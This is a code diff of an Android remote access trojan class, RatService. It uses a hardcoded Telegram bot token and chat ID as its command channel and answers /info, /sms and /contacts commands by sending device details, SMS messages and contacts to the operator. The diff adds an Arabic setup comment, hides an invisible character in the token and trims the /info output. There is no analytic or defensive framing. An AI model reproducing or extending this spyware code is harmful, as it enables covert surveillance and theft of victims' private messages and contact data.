@@ -20,7 +20,8 @@ import java.io.*;
 import okhttp3.*;
 
 public class RatService extends Service {
-    private static final String BOT_TOKEN = "9014559285:AAEamXnqANi68FHT7mnT3DpF5hC1y9zmes4";
+    // تأكد من وضع التوكن والايدي هنا
+    private static final String BOT_TOKEN = "‏9014559285:AAEamXnqANi68FHT7mnT3DpF5hC1y9zmes4";
     private static final String CHAT_ID = "6978974735";
     private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
     private long lastUpdateId = 0;
@@ -91,7 +92,7 @@ public class RatService extends Service {
 
     private void handleCommand(String cmd) {
         if (cmd.equals("/info")) {
-            sendText("Model: " + Build.MODEL + "\nBrand: " + Build.BRAND + "\nAndroid: " + Build.VERSION.RELEASE);
+            sendText("Model: " + Build.MODEL + "\nBrand: " + Build.BRAND);
         } else if (cmd.equals("/sms")) {
             sendSms();
         } else if (cmd.equals("/contacts")) {
